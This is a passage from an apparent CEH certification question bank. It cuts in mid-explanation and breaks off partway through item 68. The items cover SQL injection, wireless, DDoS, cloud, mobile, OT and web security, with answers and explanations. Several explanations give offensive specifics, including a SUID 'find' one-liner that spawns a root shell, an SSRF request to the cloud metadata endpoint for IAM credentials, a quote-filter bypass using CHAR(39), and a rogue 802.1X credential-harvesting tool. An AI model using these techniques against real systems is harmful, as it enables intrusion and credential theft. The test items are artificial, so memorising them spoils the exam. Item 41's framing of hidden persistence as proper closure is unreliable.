+Correct Answer: C Explanation: UNION-based in-band SQLi appends a UNION SELECT whose column count and data types must match the original query so the DBMS can merge result sets; testers often use ORDER BY n probing and NULL placeholders to align columns, then project extractable fields (e.g., current_user, version()) into UI-bound columns. Option A is unrelated because it requires stored payload activation. Option B is incorrect since timing is not used. Option D is incorrect because stacked injections run additional statements sequentially rather than merging result sets into the same response. Defense-in-depth includes parameterized queries, positive server-side validation, least-privilege DB accounts, and WAF rules as compensating controls per CEHv13 best practices.
+
+35. While surveying the 2.4 GHz band in a crowded environment, you observe overlapping channels and significant adjacent channel interference (ACI). Which channel plan embodies the correct wireless concept to minimize co-channel and adjacent-channel interference on 2.4 GHz in most regulatory domains?
+A. Channels 2, 7, and 12 because they avoid the common defaults and reduce probe traffic
+B. Channels 1, 5, and 9 because they distribute energy evenly across the band with minimal overlap
+C. Channels 1, 6, and 11 because they are non-overlapping 20 MHz channels under typical 2.4 GHz constraints
+D. Channels 3, 8, and 13 because they align with 5-channel spacing, eliminating ACI
+Correct Answer: C Explanation: In 2.4 GHz, the standard non-overlapping 20 MHz channel plan in many regions is 1/6/11; this minimizes both co-channel interference and adjacent-channel interference when deployed properly, so C is correct. A and D still produce overlapping spectral masks in most domains; 2 and 12 (A) or 3 and 13 (D) encroach on adjacent channels, creating ACI. B is incorrect because 1/5/9 overlaps severely (5 is adjacent to 6; 9 overlaps 6 and 11), which increases contention and degrades throughput. CEH candidates should also recognize that channel bonding (40 MHz) in 2.4 GHz is generally discouraged due to limited spectrum.
+
+36. During logout testing, you observe the server replies Set-Cookie: session=; Max-Age=0 but retains the session server-side; reusing the old cookie on another client still yields an authenticated session until natural expiry. What is the MOST appropriate fix?
+A. Add anti-CSRF tokens specifically to the /logout endpoint
+B. Switch to HTTP Basic authentication to avoid cookies
+C. Clear the cookie with Secure; HttpOnly; SameSite and Domain unset
+D. Invalidate server-side sessions on logout (delete/mark expired in the session store), and ensure token revocation/blacklisting for long-lived refresh/persistent tokens, with ID rotation on next login
+Correct Answer: D Explanation: Clearing the client cookie alone does not end the server session; proper logout requires server-side invalidation in the session store and revocation of any refresh/persistent tokens (D). CSRF protection on logout (A) may be desirable but does not fix lingering server sessions. HTTP Basic (B) is stateless and typically worse for web SSO UX and does not provide revocation. Clearing with flags (C) is good hygiene but, without server invalidation, a copied cookie remains valid; the server must treat the session ID as invalid from that moment onward and rotate on subsequent authentications.
+
+37. A SOC notes an adversary using “carpet bombing”: traffic is distributed across all IPs in the victim’s /22, each destination receiving only a small rate, but the aggregate saturates the uplink. Which description BEST characterizes this DoS/DDoS technique?
+A. A single VIP is overwhelmed by a high-rate flood to trigger VIP-specific auto-scaling failures
+B. Low-rate flows are spread across many addresses in a prefix to evade per-destination thresholds while achieving aggregate saturation
+C. Attackers inject malformed BGP updates to cause upstream route flaps and blackholes
+D. Attackers send jumbo ICMP echo requests to a single router to fragment and drop
+Correct Answer: B Explanation: Carpet bombing distributes attack traffic over many IPs within a target prefix so that each individual host stays below common thresholds/rate-limits, but the cumulative effect congests the shared access/uplink; it is designed to evade simple per-IP defenses and shift mitigation to provider-edge controls (e.g., BGP Flowspec, prefix-wide filters). Option A focuses on a single VIP, which is the opposite pattern. Option C is a routing-layer attack (BGP) not implied by the symptom. Option D would be localized and easy to spot per-device, not a prefix-wide low-rate spread.
+
+38. During a red team exercise, testers flood the airwaves with continuous jamming signals on the 2.4 GHz band, rendering all Wi-Fi communication unusable. Which wireless threat is being performed?
+A. Deauthentication flooding
+B. RF jamming attack
+C. Session hijacking
+D. Man-in-the-Browser attack
+Correct Answer: B Explanation: RF jamming deliberately emits interference in the 2.4 GHz spectrum to block Wi-Fi communication, effectively causing denial of service, so B is correct. A is incorrect because deauthentication flooding targets management frames, not the entire RF channel. C is incorrect since session hijacking compromises established sessions, not RF availability. D is incorrect because man-in-the-browser targets web browsers, not wireless radio channels.
+
+39. A security team is asked to harden a new workload that will run on a cloud provider’s managed Kubernetes service. The team wants to retain control over the OS image of worker nodes, network ACLs, and IAM roles for pods, while the provider manages the control plane and etcd availability. Which cloud service model best fits this division of responsibilities?
+A. Software as a Service (SaaS)
+B. Platform as a Service (PaaS)
+C. Infrastructure as a Service (IaaS)
+D. Function as a Service (FaaS)
+Correct Answer: B Explanation: PaaS is correct because a managed Kubernetes service is a platform abstraction where the provider operates the control plane (API server, scheduler, etcd) and offers opinionated platform capabilities, while customers configure node groups (often via managed node pools or self-managed nodes), network ACLs/security groups, and workload IAM (e.g., IAM roles for service accounts), aligning with PaaS characteristics of provider-managed platform with customer-managed application/runtime configuration; SaaS is incorrect because SaaS delivers a complete application (e.g., email or CRM) with minimal customer control over runtime or OS; IaaS is incorrect because IaaS exposes raw compute, storage, and networking where the customer fully manages the OS and orchestration layer—not the case when the provider runs the K8s control plane; FaaS is incorrect because serverless functions abstract away servers and orchestration entirely, giving customers only code-level control without managing worker node OS images or pod-level IAM.
+
+40. When attempting to detect honeypots, which of the following checks specifically targets the containment policies and safety mechanisms that operators apply to decoys (and therefore helps distinguish them from production hosts)?
+A. Measuring TCP MSS to determine maximum segment size supported by the path.
+B. Observing whether the host permits outbound connections or is strictly egress-restricted (no external callbacks).
+C. Verifying the server’s TLS certificate chain is signed by a public CA.
+D. Confirming ICMP is allowed through the perimeter firewall.
+Correct Answer: B Explanation: B is correct because honeypots are often deployed with strict containment: limited or no outbound connectivity, disabled DNS resolution for attacker callbacks, or proxied/filtered egress to prevent the decoy from being abused; detecting such constraints (e.g., attempt to make the host initiate outbound connections and observe lack of callbacks) is an effective honeypot detection approach. A (MSS) is a path characteristic and not related to containment. C (public-CA TLS cert) can be present on both honeypots and real servers and is not a containment indicator. D (ICMP allowance) is a network configuration detail and not a targeted check for decoy containment policies.
+
+41. During a red team exercise, the operators follow the wireless hacking methodology. They have already gained access and pivoted into the wired LAN. Which final phase ensures proper closure of the operation?
+A. Covering tracks, including clearing logs and removing rogue APs or backdoors
+B. Performing beacon flooding to overwhelm nearby Wi-Fi scanners
+C. Launching continuous deauthentication flooding for maximum disruption
+D. Conducting offline brute-force attacks against additional SSIDs
+Correct Answer: A Explanation: The final phase of wireless hacking methodology emphasizes covering tracks to avoid detection—clearing logs, removing rogue devices, and ensuring persistence is hidden. A is correct. B and C are disruptive DoS tactics that would attract attention, not proper closure. D is a continuation of exploitation, not the final methodology step.
+
+42. A penetration tester wants to hide exfiltrated configuration data inside innocuous-looking images to evade simple file scans. Which technique BEST describes this approach?
+A. File slack steering using unallocated disk sectors
+B. Steganography — embedding data into image/audio file carrier formats (e.g., LSB-based techniques)
+C. Using NTFS junction points to relocate files out of the visible tree
+D. Creating a hidden Windows service that stores data in registry values
+Correct Answer: B Explanation: Option B is correct because steganography is the practice of embedding information within legitimate carrier files (images, audio, video) by modifying less-significant bits or metadata such that the carrier appears normal while carrying hidden payloads. CEH discusses steganographic tools and detection indicators (statistical anomalies, unusual metadata, or file-size mismatches). Option A (file slack) refers to leftover space at the end of files/cluster slack which can store data covertly at the filesystem level, but it is not the same as deliberately inserting data into image pixels/audio samples; slack is lower-level and more platform/forensics-dependent. Option C (NTFS junction points) are reparse points used for filesystem redirection and are visible to skilled investigators; they do not embed content inside carrier files. Option D (hidden service storing registry values) persists data in registry entries but is not steganography and is often discovered by registry audits; it’s a different persistence/data-storage method. Detection of steganography requires behavioral and statistical analysis, content whitelisting, and monitoring for unusual outbound transfers.
+
+43. A contractor briefly gains physical access to an unlocked Android device with Developer Options enabled. They use adb backup to extract sensitive app data because the application’s manifest permits backups. Which mobile attack vector does this illustrate?
+A. Exploiting addJavascriptInterface in WebView to achieve code execution
+B. Abusing Android’s backup mechanism when android:allowBackup="true" to exfiltrate data
+C. Performing a SIM-swap to intercept SMS one-time passwords (OTPs)
+D. Conducting an NFC relay attack against a contactless payment app
+Correct Answer: B Explanation: With allowBackup=true, logical backups (via ADB or backup transports) can include app-private files unless the developer opts out or applies encryption/exclusion policies; brief physical access can therefore yield cleartext databases, tokens, or keys if the app is misconfigured (B). WebView JS bridges (A) are a different attack surface requiring exposed interfaces and JS injection. SIM-swap (C) targets carrier identity to capture OTPs rather than local data at rest. NFC relays (D) involve proximity payment protocols and do not extract application storage via the backup subsystem.
+
+44. An organization wants to prevent uploaded user files from being executed as server-side code. Which combination of countermeasures at the web server layer most directly mitigates this risk?
+A. Use CSP policies and HSTS only
+B. Store uploads outside the webroot, enforce allowlist file types/extensions, and configure the web server to treat upload directory as non-executable
+C. Enable verbose error messages and return stack traces to the client
+D. Increase session timeout and require frequent password changes
+Correct Answer: B Explanation: The correct mitigation is to store uploaded files outside the webroot (so they cannot be directly requested/executed), enforce a strict allowlist of permitted file types and sanitized filenames, and configure the web server (or runtime) to mark upload directories as non-executable (e.g., disable PHP/ASP processing in that location, use Options -ExecCGI in Apache or location blocks in Nginx that serve files only). This layered approach reduces the chance that an attacker can upload a web shell and execute it. Option A (CSP/HSTS) is inappropriate here — CSP/HSTS are client-side/browsing protections and do not prevent server-side execution of uploaded code. Option C is wrong and increases information leakage which aids attackers. Option D (session timeout/password rotation) is unrelated to file upload execution risks.
+
+45. You are developing a reliable exploit for a stack-based buffer overflow on 64-bit Windows where DEP is enabled and ASLR is partially enabled on loaded modules. Which technique MOST directly enables execution of arbitrary payload code?
+A. Use a large NOP sled and jump to shellcode on the stack
+B. Disable DEP via Group Policy and re-run the exploit
+C. Perform heap spraying so the payload lands at predictable addresses and jump to it
+D. Build a Return-Oriented Programming (ROP) chain to call VirtualProtect/VirtualAlloc (or NtProtectVirtualMemory) to mark your payload as executable, then transfer execution to it
+Correct Answer: D Explanation: Option D is correct because DEP prevents execution from non-executable pages (like the stack); a ROP chain constructed from existing code gadgets in non-ASLR or leaked-address modules can invoke APIs to change page protections (VirtualProtect/VirtualAlloc/NtProtectVirtualMemory) so the payload becomes executable, after which control can be safely transferred. Option A fails because DEP blocks execution on the stack regardless of NOP sleds. Option B assumes control over system policy and is not realistic in exploitation scenarios. Option C (heap spraying) alone does not bypass DEP and is far less reliable under modern ASLR without an information leak; it does not inherently change page permissions. Defenses include enforcing ASLR on all modules, Control-Flow Guard/CFI, compiler hardening, and prompt patching.
+
+46. Your SOC detects PowerShell-based credential dumping via LSASS access on two endpoints, followed by Kerberoasting and constrained delegation abuse. The actor then establishes RDP tunnels through an internal jump host and uses a custom data staging tool that writes AES-encrypted archives to a hidden share. Which containment action is MOST appropriate first when dealing with a suspected APT still active in the environment?
+A. Execute a rapid enterprise-wide password reset and rotate all service account keys immediately without prior scoping
+B. Isolate affected hosts from the network, preserve volatile evidence, and silently enable enhanced telemetry to map extent of compromise before tipping off the actor
+C. Publicly blocklist the observed domains and announce the incident to all staff in a company-wide email
+D. Wipe and reimage the two observed endpoints to quickly remove the malware and restore service
+Correct Answer: B Explanation: Option B best reflects CEH/IR best practices: isolate affected nodes (ideally via EDR network containment), capture memory and artifacts, and expand telemetry to identify lateral movement before global resets, which may trigger counter-actions. Immediate global resets (A) can alert the adversary and cause operational disruption without understanding blast radius. Public announcements (C) and premature reimages (D) destroy evidence and signal defenders’ moves. Thus B is the correct containment priority.
+
+47. On a compromised Linux host, you discover that /usr/bin/find has the SUID bit set (owner root). You want a root shell with minimal artifacts. Which single action is MOST direct?
+A. Edit /etc/sudoers to add your account to the sudoers list
+B. Run “sudo -l” to enumerate allowed commands and attempt allowed escalation
+C. Abuse /etc/ld.so.preload to inject a shared object for privilege escalation
+D. Execute “/usr/bin/find . -exec /bin/sh -p ; -quit” to spawn a privileged shell via the SUID binary
+Correct Answer: D Explanation: Option D is correct because SUID-root “find” is a classic GTFOBins case; find’s -exec can invoke /bin/sh, and with SUID the shell inherits effective-UID root; the “-p” flag preserves privileges, immediately yielding a root shell with a single command—aligning with CEH Linux privilege escalation concepts. Option A is incorrect because editing /etc/sudoers requires root first. Option B merely enumerates sudo permissions and won’t help if you are not already a sudoer. Option C can work but requires writing to protected system files and usually more steps, leaving more artifacts; the SUID-abuse one-liner is the most direct and exam-relevant technique. Defensively, CEH emphasizes auditing SUID files (find / -perm -4000 -type f), removing unsafe SUID bits, and using EDR/FS integrity monitoring.
+
+48. While performing web-service footprinting you find an S3-backed API endpoint returning JSON that includes presigned S3 URLs (with X-Amz-Signature) and short TTL. Under responsible disclosure and methodology, what is the best immediate action?
+A. Document the presence of presigned URLs (including example sanitized URLs and TTL), warn about potential data exposure if URLs are leaked or logged, and advise reducing TTL and moving to tokenized access with strict ACLs; do not use the presigned URLs to download objects unless explicitly authorized
+B. Immediately use the presigned URLs to download objects to determine whether sensitive data is present, then include the downloaded content in the report as proof
+C. Revoke the whole S3 bucket to protect the data, and tell the client you have done so to demonstrate proactive remediation
+D. Share the presigned URL publicly to test whether others can access it and to stress the severity of the exposure
+Correct Answer: A Explanation: A is correct: presigned S3 URLs are sensitive tokens; the tester should document their existence (sanitizing values), capture TTLs, and recommend mitigation (shorter TTLs, stricter IAM policies, tokenized proxying) while not accessing the objects unless explicitly permitted. B is incorrect because downloading objects is active access to data and may be unauthorized; it can also create legal exposure. C is impossible and illegal — the tester cannot revoke or alter client assets. D (public disclosure) is unethical and dangerous.
+
+49. A spyware campaign is distributing an iOS app outside the App Store without jailbreaking by tricking victims into installing a “business” profile and then the app. What prerequisite most directly enables this distribution path?
+A. A public TestFlight link that bypasses Apple’s review entirely
+B. Developer Mode enabled on the device to allow local sideload from Xcode
+C. A jailbroken device with substrate installed to load unsigned binaries
+D. A valid Apple Developer Enterprise Program signing certificate and a provisioning profile installed on the device to trust that signer
+Correct Answer: D Explanation: Enterprise distribution relies on an Apple Enterprise (in-house) certificate and corresponding provisioning profile so that devices trust apps signed by that organization without App Store review; social engineering users to install the profile enables sideloading at scale (D). TestFlight (A) still operates under Apple’s review and sandbox. Developer Mode (B) enables local developer builds via Xcode for the owner’s device, not mass distribution to strangers. Jailbreaking (C) is not required for enterprise-signed sideloads and is absent in this vector.
+
+50. A detected implant uses legitimate OPC UA subscriptions to inject false telemetry values into the historian while keeping operator displays plausible. Which defensive control would MOST directly limit the success of such an implant?
+A. Enforce application-layer authentication and authorization (mutual TLS for OPC UA) with certificates tied to device identity and fine-grained server-side access control for write operations.
+B. Turn off OPC UA logging to reduce visibility of anomalies.
+C. Place all OPC UA servers on the enterprise LAN without segmentation to centralize control.
+D. Increase polling frequency of HMIs to mask injected telemetry.
+Correct Answer: A Explanation: Enforcing strong application-layer auth (mutual TLS), ensuring certificate-based identities, and server-side authorization for subscriptions/writes prevents unauthorized implants from subscribing or writing false telemetry—it stops misuse at the protocol/authentication boundary. Option B (turning off logging) removes detection capability and worsens incident response. Option C (placing servers on enterprise LAN unsafely) increases exposure and is the opposite of segmentation best practices. Option D (increasing HMI polling) does not prevent injection; it may increase load and still allow attackers to alter values—so A is the proper protocol-level defense.
+
+51. A penetration tester discovers that a web app allows framing by any site. This opens the door to which client-side attack?
+A. SQL injection
+B. Clickjacking
+C. XML External Entity injection (XXE)
+D. DNS rebinding
+Correct Answer: B Explanation: Allowing unrestricted framing lets attackers overlay invisible buttons/forms over legitimate content, tricking users into unintended actions, known as clickjacking (B). SQL injection (A) and XXE (C) are server-side issues. DNS rebinding (D) targets client-side browser trust in hostnames, but not framing. Countermeasures include X-Frame-Options: DENY or CSP frame-ancestors 'none'.
+
+52. In a serverless (FaaS) model, who is primarily responsible for patching the underlying OS, hypervisor, and runtime infrastructure hosting your function code?
+A. The cloud service provider
+B. The application developer writing the function
+C. The DevOps team operating CI/CD pipelines
+D. An external tenancy audit firm
+Correct Answer: A Explanation: A is correct because in FaaS the provider manages the OS, hypervisor, and runtime infrastructure as part of the shared responsibility model, while customers own secure code, configuration (IAM, network, data), and secret handling. B and C are responsible for application-level concerns (secure coding, dependency hygiene, CI/CD), not host patching. D is an assurance activity, not an operational owner. CEH exam emphasis: understand how shared responsibility shifts as you move from IaaS → PaaS → FaaS/SaaS.
+
+53. AXFR is blocked on a target, but the domain uses DNSSEC. Under which condition can you still enumerate hostnames by zone walking and why?
+A. The zone signs with NSEC (not NSEC3), letting you traverse next-secure links that list existing names in cleartext
+B. The zone uses NSEC3 with “opt-out” and a long salt, which reveals owner names in hashed form that can be trivially reversed
+C. The presence of a DS record alone permits walking using the parent’s signed referrals
+D. Any DNSSEC-signed zone is fully enumerable as signatures are public
+Correct Answer: A Explanation: With NSEC, each record links to the “next” name, enabling deterministic walking of the namespace in cleartext. NSEC3 (B) hashes owner names; with properly chosen parameters it thwarts straightforward walking (opt-out further reduces coverage), so it is not “trivially” reversible. A DS record (C) merely indicates delegation is signed, not that names are listable. D is false—DNSSEC does not imply enumerability; NSEC3 was introduced specifically to mitigate NSEC walking.
+
+54. In a single-page application, the front end on app.example.com fetches data from api.example.com. Which statement BEST describes the browser’s same-origin policy (SOP) in this scenario?
+A. SOP blocks all cross-origin requests; the browser prevents any request to api.example.com
+B. SOP applies only to cookies; scripts can freely read cross-origin responses
+C. SOP allows cross-origin requests to be sent but prevents scripts from reading responses unless CORS permits it
+D. SOP is a server-side access control that the API enforces, not a browser control
+Correct Answer: C Explanation: The SOP is a browser-enforced client-side policy: pages can send cross-origin requests (e.g., via , , fetch), but scripts cannot read the cross-origin response bodies unless the target origin explicitly permits it via CORS headers; thus (C) is accurate. (A) is incorrect because requests themselves are not blocked categorically. (B) is wrong because SOP restricts programmatic access to cross-origin response data, not merely cookies. (D) misunderstands enforcement location: servers opt into trust via CORS headers, but enforcement remains in the browser. Proper CORS configuration is essential to safely relax SOP when needed (e.g., specifying exact origins, methods, headers; disallowing * with credentials).
+
+55. A tester needs to bypass a naïve parameter filter that blocks single quotes (') but allows percent signs. The application concatenates input directly into SQL and later performs CAST() operations. Which approach is most likely to bypass the filter while still causing the DBMS to evaluate the intended injected expression?
+A. Use URL-encoding of the single quote as %27 and rely on the server to decode it before query execution
+B. Replace the single quote with the equivalent concatenation using database string functions (e.g., CHAR(39) or CHAR(0x27)) inside the payload
+C. Use TLS to encrypt the request so the WAF cannot inspect payloads
+D. Switch to boolean-based blind techniques only, because filters always block direct payloads
+Correct Answer: B Explanation: Correct — Option B (use CHAR()/CHAR() equivalents) substitutes explicit character functions (e.g., CHAR(39) in SQL Server or CHR(39) in Oracle) so the payload avoids literal ' characters while the DBMS reconstructs the string at execution time; this is a standard evasion when direct quotes are filtered. Option A (URL-encoding) will fail if the WAF or server decodes early or normalizes inputs; many WAFs decode before inspection, and relying on decoding is fragile — it’s less reliable than character-function substitution. Option C (TLS) does not bypass WAF if the WAF is inline and performs TLS inspection/termination (common in enterprise deployments), and it’s not an SQL-level evasion technique. Option D is incorrect because boolean-based blind is an alternative technique but not the only method — it’s unnecessary if the attacker can instead obfuscate the payload using CHAR()/CHR functions to bypass quote filters while achieving in-band results.
+
+56. Your team is selecting a methodology that emphasizes measurable trust levels, operational security testing, and rules of engagement that consider human, physical, wireless, and data communications channels. Which framework aligns best with these goals?
+A. OSSTMM
+B. OWASP Testing Guide
+C. Cyber Kill Chain
+D. ISO/IEC 27001 Annex A
+Correct Answer: A Explanation: OSSTMM (Open Source Security Testing Methodology Manual) focuses on operational security testing across multiple channels (Human, Physical, Wireless, Telecommunications, and Data Networks) and introduces trust metrics to quantify exposure and controls—making A correct. B OWASP TG is primarily for web application security testing. C Cyber Kill Chain is an adversary lifecycle model for intrusion analysis, not a trust-metric testing framework. D ISO/IEC 27001 Annex A is a control catalog for ISMS implementation, not a hands-on security testing methodology with trust metrics.
+
+57. A campus uses 802.1X with fallback to MAC Authentication Bypass (MAB) for legacy printers and IP phones. A tester clones the printer’s MAC address onto a laptop and gains access to the printer VLAN with no user credentials. Which attack MOST accurately explains this outcome?
+A. MAC spoofing to impersonate an allowed device and pass MAB’s static checks
+B. VLAN hopping via double-tagging to traverse to the native VLAN
+C. ARP cache poisoning to redirect traffic flows through the attacker’s host
+D. DHCP starvation to force the switch into hub-like behavior
+Correct Answer: A Explanation: MAC spoofing allows the attacker to impersonate a whitelisted endpoint in environments relying on MAB, which authenticates based on the MAC address rather than user credentials (A). Without stronger controls (e.g., EAP-TLS for all devices, profiling, or device certificates), MAB is susceptible to cloning. Double-tagging (B) is a VLAN hopping technique unrelated to passing MAB. ARP poisoning (C) impacts IP-to-MAC mappings at hosts, not admission control decisions. DHCP starvation (D) disrupts address allocation but doesn’t grant access via MAB. Defenses include limiting MAB use, binding MACs to specific switchports, and pairing with Port Security and profiling (e.g., Cisco ISE with SGT/SGACL).
+
+58. A vishing script is being reviewed for risk. Which line should be REMOVED to keep the script within footprinting boundaries?
+A. “Could you confirm if your ServiceNow instance uses the ‘/nav_to.do’ path for incidents or a custom URL?”
+B. “Roughly how many analysts are on the overnight shift, just a range is fine?”
+C. “Please read me the six-digit code you just received so I can verify your identity.”
+D. “Do after-hours incidents escalate directly to on-call or via a manager page-out?”
+Correct Answer: C Explanation: Asking for an OTP or MFA code (“six-digit code”) is an access-enablement step typical of credential theft, not reconnaissance. It breaches ethical limits and common RoE, and would immediately convert a footprinting exercise into a compromise attempt (ATT&CK T1566.002/T1656). A, B, and D are bounded context questions that, while still needing approval and minimalism, can remain within reconnaissance if the scope explicitly allows high-level workflow mapping without secrets or personal data.
+
+59. In planning a social engineering campaign during a sanctioned assessment, the team wants to strengthen their pretext by harvesting non-sensitive but specific public details (org chart fragments, vendor logos used on site, typical email signature formats). Which approach is most appropriate and ethical during the planning phase?
+A. Purchasing initial access credentials from underground markets to validate real formats
+B. Performing OSINT using sources like LinkedIn, company press releases, and theHarvester output
+C. Port scanning the corporate perimeter to fingerprint web server versions for banner reuse
+D. Sending a “test” phishing email to random employees before approvals to measure click rates
+Correct Answer: B Explanation: Ethical planning emphasizes Open-Source Intelligence (OSINT) from publicly accessible sources to craft credible but non-intrusive pretexts; tools like theHarvester, Recon-ng, and Maltego, along with LinkedIn, press releases, job postings, and vendor brochures, help collect surface-level artifacts (naming conventions, logos, email formats) without unauthorized access. Buying credentials (A) is unethical and illegal; perimeter scanning (C) is technical recon and does not directly provide social proof artifacts like signatures and org details, and should only occur within authorized scope but still isn’t ideal for pretext materials; sending test phishing (D) before explicit approvals violates rules of engagement and could create liability.
+
+60. An e-commerce site renders user-supplied strings through a Jinja2 template. Supplying {{7*7}} yields 49, and further payloads reveal access to built-ins. Which mitigation BEST addresses this server-side template injection (SSTI)?
+A. Encode user input with HTML entities before rendering so the browser treats it as text
+B. Move the application behind a WAF to block curly braces {} in requests
+C. Store templates in a CDN so attackers cannot modify them
+D. Never treat user input as a template; pass it only as data into precompiled/sandboxed templates with expression evaluation disabled for untrusted input (use autoescape and a logic-less or restricted engine)
+Correct Answer: D Explanation: SSTI occurs when untrusted input is interpreted by the template engine; the fix is architectural—do not render user data as template code. Precompile/sandbox templates, disable expression evaluation for untrusted fields, and enable autoescape; logic-less or restricted engines reduce attack surface (D). HTML entity encoding (A) helps for XSS but not SSTI, which executes server-side before output. WAFs (B) are bypassable; SSTI payloads vary widely beyond curly braces. Hosting templates on a CDN (C) doesn’t change server evaluation semantics. Add strict separation of view logic and data, and unit tests asserting literals remain literals.
+
+61. During a UNIX-targeted engagement, rpcbind shows mountd and nfs services reachable from your subnet. You want to identify file systems that clients can mount. Which enumeration step is MOST appropriate?
+A. Use smbclient to list network shares exposed by the host
+B. Query rpcbind (rpcinfo -p) and assume all listed programs are mountable exports
+C. Query the NFS/ mountd service using the “showmount” mechanism to list exported directories
+D. Perform FTP directory listings over TCP/21 to discover exported NFS paths
+Correct Answer: C Explanation: NFS enumeration relies on querying mountd via the showmount protocol to retrieve the export list and associated client or netgroup restrictions (C), which directly indicates what can be mounted. smbclient (A) targets SMB/CIFS, not NFS. rpcbind (B) only enumerates RPC programs and ports; it does not list export paths—additional interaction with mountd is required. FTP listings (D) are unrelated to NFS and reveal only FTP-exposed directories. After exports are identified, testers may attempt “soft” mounts from permitted IPs or subnets to enumerate contents, honoring engagement scope and rules of behavior.
+
+62. During an internal assessment, UDP/161 is reachable across several network segments. You want to very quickly discover which devices respond to SNMP and which community strings are valid with the least number of packets per host, then follow up with targeted walks. Which tool/approach is MOST appropriate for the initial sweep?
+A. Send unsolicited SNMPv2c traps with snmptrap against broadcast and parse replies for communities
+B. Use onesixtyone with a curated wordlist to brute-force SNMPv1/v2c community strings by probing 1.3.6.1.2.1.1.1.0 (sysDescr)
+C. Run snmpwalk -v3 -l authPriv -u audit -a SHA -A pass -x AES -X pass against all IPs in parallel
+D. Use netdiscover/ARP sweep to infer SNMP-capable hosts by vendor MAC OUIs
+Correct Answer: B Explanation: For rapid discovery of SNMPv1/v2c and community validation, onesixtyone efficiently probes a small set of OIDs (commonly sysDescr.0) with candidate communities and classifies hosts as responding or not, providing a fast, low-packet baseline for subsequent enumeration (B). Option A is incorrect because snmptrap sends traps to a manager; devices do not reply with their community strings and this does not validate read communities. Option C assumes known SNMPv3 credentials and imposes heavy, credentialed traffic; it is unsuitable for broad discovery and will fail without correct users/keys. Option D can find active hosts and vendors but cannot determine SNMP responsiveness or community validity; OUIs are not a proxy for SNMP exposure.
+
+63. Which statement about stacked (batched) queries in SQL injection is MOST accurate across common DBMS platforms?
+A. Stacked queries are universally supported and always exploitable through HTTP GET parameters
+B. Stacked queries are primarily a front-end feature and depend only on the browser accepting semicolons
+C. Support for stacked queries depends on the DBMS and driver; even when supported, application-layer APIs often restrict multiple statements
+D. Stacked queries are synonymous with UNION-based injection because both return multiple result sets in one response
+Correct Answer: C Explanation: Support for stacked queries depends on the DBMS and database driver (e.g., SQL Server and PostgreSQL commonly support multiple statements; MySQL may require specific configurations like CLIENT_MULTI_STATEMENTS), and many application frameworks/ORMs or driver settings disable executing multiple statements for safety. Therefore, exploitability is inconsistent and often blocked at the application layer. Options A and B misattribute the behavior to universal support or browsers, and D conflates stacked queries with UNION-based injection, which are distinct techniques.
+
+64. Your blue team observes distributed, low-and-slow reconnaissance against many subnets: a handful of ports per host, minutes to hours apart, from rotating source IPs. What capability MOST improves detection of this scanning pattern?
+A. Per-host syslog on each server, alerting on three failed connections within 10 seconds.
+B. Enterprise-wide flow telemetry (NetFlow/IPFIX) with long-window aggregation and analytics (e.g., Zeek/SiLK), correlating sparse probes across subnets and time to flag horizontal scans.
+C. A WAF in front of the public web tier with strict header validation.
+D. Increasing IDS signature thresholds to reduce noise from benign scanners.
+Correct Answer: B Explanation: Distributed low-and-slow reconnaissance evades point sensors and short windows. Flow telemetry aggregated across routers/switches with analytics (Zeek, SiLK, or SIEM-driven models) provides visibility into scan “shape” over time and space, correlating sparse connection attempts across many hosts—this is the CEHv13-recommended approach for detecting modern reconnaissance. Option A’s tight window misses slow scans. Option C protects only HTTP and doesn’t help with general L3/L4 reconnaissance. Option D raises thresholds and risks missing exactly the stealthy behavior you must catch.
+
+65. For enterprise 802.1X credential harvesting via a rogue authenticator that emulates RADIUS/EAP and captures inner MSCHAPv2 exchanges, which tool is purpose-built to act as a malicious authenticator?
+A. hostapd (vanilla)
+B. freeradius (stock)
+C. Kismet
+D. hostapd-wpe (Wireless Pwnage Edition)
+Correct Answer: D Explanation: hostapd-wpe is a fork/variation of hostapd tailored to offensive testing that can emulate an 802.1X/WPA-Enterprise authenticator and capture inner authentication credentials (e.g., MSCHAPv2 challenge/response) for offline cracking; it’s widely used in enterprise credential harvesting exercises. Plain hostapd (A) is a legitimate AP daemon and can be adapted but lacks the hostile EAP capture features out of the box. FreeRADIUS (B) is an open RADIUS server used for legitimate authentication — not an offensive harness by itself. Kismet (C) is a passive sniffer/IDS, not a rogue authenticator.
+
+66. Which statement best explains why deterministic latency and jitter constraints in OT networks (e.g., control loops) affect vulnerability management strategies compared to IT environments?
+A. OT devices always support hot-patched updates so vulnerability management is identical to IT.
+B. Control loops tolerate arbitrary maintenance windows so frequent patching is preferable.
+C. Deterministic latency requirements often require staged, pre-tested patching on testbeds and scheduled maintenance windows because an update that increases jitter or CPU load can cause physical process instability.
+D. OT devices are isolated and therefore never require vulnerability patching.
+Correct Answer: C Explanation: OT systems often have real-time constraints; updates that alter timing characteristics, add CPU load, or change network behavior can introduce jitter or latency that destabilizes control loops and may create safety incidents. Therefore vulnerability management must include lab testing, staged rollouts, vendor-approved patches, and coordinated maintenance windows. A is false—many OT devices do not support hot patches. B is incorrect—control loops do not tolerate arbitrary maintenance windows. D is false; isolation is not guaranteed and even isolated devices require patching. Thus C accurately describes why OT vulnerability management differs from typical IT.
+
+67. A public-facing API has an insufficiently validated URL parameter and you discover SSRF is possible. Which of the following SSRF payload goals aligns BEST with gaining access to internal cloud resources in order to escalate privileges?
+A. Use SSRF to inject JavaScript into the web application and run it in other users’ browsers.
+B. Use SSRF to cause the backend to POST to an external attacker-controlled webhook, leaking environment variables.
+C. Use SSRF to request the instance metadata endpoint (http://169.254.169.254/latest/meta-data/) to retrieve temporary IAM credentials.
+D. Use SSRF to enumerate external DNS records to identify subdomains.
+Correct Answer: C Explanation: Option C is correct because in many cloud environments (AWS, Azure, GCP) instance metadata endpoints are accessible only from the VM itself (link-local address 169.254.169.254 on AWS), and SSRF can be used to make the server request that link-local address and return IAM instance credentials or tokens — a high-value method for gaining access to cloud resources described in CEH’s gaining-access curriculum. Option A (XSS) is a different client-side attack and not the typical SSRF leading to internal cloud privilege escalation. Option B (POST to external webhook) could leak some data but is dependent on what the application forwards; it’s less reliably privileged than directly retrieving the metadata service. Option D (DNS enumeration) is reconnaissance but not directly priv-escalation. Defensive steps include restricting metadata access (IMDSv2 on AWS), network egress controls, application-level URL allowlists, and input validation/encoding to block SSRF.
+
+68. A target’s SMTP banner shows “ESMTP Postfix” and the server supports STARTTLS. You aim to enumerate supported ESMTP extensions (e.g., PIPELINING, SIZE, 8BITMIME) in the least intrusive way. What should you do NEXT?
+A. Send VRFY and EXPN after STARTTLS to observe permitted extensions in error text
